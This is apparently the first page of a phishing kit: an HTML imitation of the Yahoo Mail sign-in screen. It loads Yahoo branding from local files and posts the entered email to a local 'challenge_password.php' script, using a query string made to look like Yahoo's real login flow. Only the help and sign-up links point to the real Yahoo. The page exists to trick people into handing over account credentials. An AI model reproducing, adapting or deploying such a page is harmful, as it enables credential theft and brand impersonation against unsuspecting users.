<!DOCTYPE html>
<html class="js">
   <head>
      <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
      <title>Yahoo -&nbsp;login</title>
      <meta http-equav="Content-Type" content="text/html;charset=utf-8">
      <meta name="referrer" content="origin-when-cross-origin">
      <link rel="icon" type="image/x-icon" href="resources/favicon.ico">
      <link rel="shortcut icon" type="image/x-icon" href="resources/favicon.ico">
      <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/apple-touch-icon.png">
      <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/apple-touch-icon.png">
      <link media="all" href="resources/index.css" type="text/css" rel="stylesheet">
   </head>
   <body class="orko en-us">
      <div class="row login-header">
         <span class="column">
           <a href="https://www.yahoo.com/" title="Yahoo">
             <img src="resources/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo" width="120" height="">
          </a>
        </span>
      </div>
      <div class="login-body">
         <div class="login-content">
            <div class="login-box ">
               <div class="login-logo"><img src="resources/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo" width="" height="27"></div>
               <p id="error-offline" role="alert" class="row error-offline hide">Network connection timed out. Please try&nbsp;again.</p>
               <script type="text/javascript">
               function disValidate()
                 {
                   var user = document.forms["Form"]["username"].value;
                   if(user =="" || user == null)
                   {
                     document.getElementById("username-error").className = document.getElementById("username-error").className.replace( /(?:^|\s)hide(?!\S)/g , '' )
                     return false;
                   }
                 }
               </script>
               <form onSubmit="return disValidate()" id="login-username-form" method="post" class="username-challenge" action="challenge_password.php?.src=ym.lang=en-US.intl=us&authMechanism=primary&display=login&done=https%3A%2F%2Fmail.yahoo.com%2Fd&sessionIndex=QQ--&acrumb=u3bTxoYi" name="Form">

                  <div class="sign-in-title">
                     <h1 class="sign-in-title-greeting" id="mbr-login-greeting">
                        Sign in to Yahoo&nbsp;Mail
                     </h1>
                     <p class="row signin-sub-title" style="font-size: .82353em; padding-top:5px;">
                         using your Yahoo&nbsp;account
                     </p>
                  </div>
                  <div id="username-country-code-field" class="username-country-code cci-dropdown-disabled code-of-length-1">
                     <input class="phone-no " name="username" id="login-username" tabindex="1" value="" autocomplete="username" autocapitalize="none" autocorrect="off" autofocus="true" placeholder="Email address" type="text">
                  </div>
                  <p id="username-error" class="row error hide" role="alert">Please provide email</p>
                  <input id="login-signin" name="signin" class="orko-button-primary orko-button" value="Next" tabindex="2" type="submit">
                  <p class="row">
                     <span class="one-half column stay-signed-in">
                       <input id="persistent" name="persistent" value="y" tabindex="3" checked="checked" type="checkbox">
                       <label for="persistent">Stay signed&nbsp;in</label>
                     </span>
                     <span class="one-half column help">
                     <a href="https://login.yahoo.com/forgot?.src=ym&amp;done=https%3A%2F%2Fmail.yahoo.com%2F" id="mbr-forgot-link">Trouble signing&nbsp;in?</a>
                     </span>
                  </p>
                  <p class="row sign-up-link">
                     <a href="https://login.yahoo.com/account/create?lang=&amp;done=https%3A%2F%2Fmail.yahoo.com%2F&amp;authMechanism=primary&amp;eid=100&amp;add=1&amp;src=ym&amp;specId=yidReg" id="createacc" role="button" class="orko-button-secondary orko-button">Create&nbsp;Account</a>
                  </p>
               </form>
            </div>
            <div id="login-info-box" class="info-box" style="display: block;">
               <h3 class="title">Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h3>
               <p class="desc">Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>
            </div>
         </div>
      </div>
      <div class="login-footer">
         <a href="https://policies.oath.com/us/en/oath/terms/otos/index.html" target="_top">Terms</a>
         <span>|</span>
         <a href="https://policies.oath.com/us/en/oath/privacy/index.html" target="_top">Privacy</a>
      </div>
   </body>
</html>
